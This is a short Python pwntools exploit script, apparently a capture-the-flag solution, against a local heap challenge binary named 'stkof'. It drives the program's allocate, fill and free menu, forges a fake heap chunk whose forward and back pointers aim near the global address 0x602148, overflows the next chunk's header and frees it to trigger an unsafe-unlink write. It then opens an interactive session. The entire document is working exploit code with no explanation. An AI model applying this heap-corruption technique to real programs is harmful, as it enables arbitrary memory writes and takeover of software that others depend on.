from pwn import *
import time
target=process('./stkof')

def malloc(size):
	target.sendline(str(1))
	target.sendline(str(size))
	print(target.recvline())
	print(target.recvline())

def fill(index,size,data):
	target.sendline(str(2))
	target.sendline(str(index))
	target.sendline(str(size))
	target.send(data)
	print(target.recvline())

def free(index):
	target.sendline(str(3))
	target.sendline(str(index))
	print(target.recvline())
	
malloc(0xa0)
malloc(0xa0)
tar=0x602148
fake=p64(0x0)+p64(0xa0)+p64(tar-0x18)+p64(tar-0x10)
data=fake.ljust(0xa0,"\x00")+p64(0xa0)+p64(0xb0)
fill(1,0xb0,data)
free(2)

target.interactive()



	
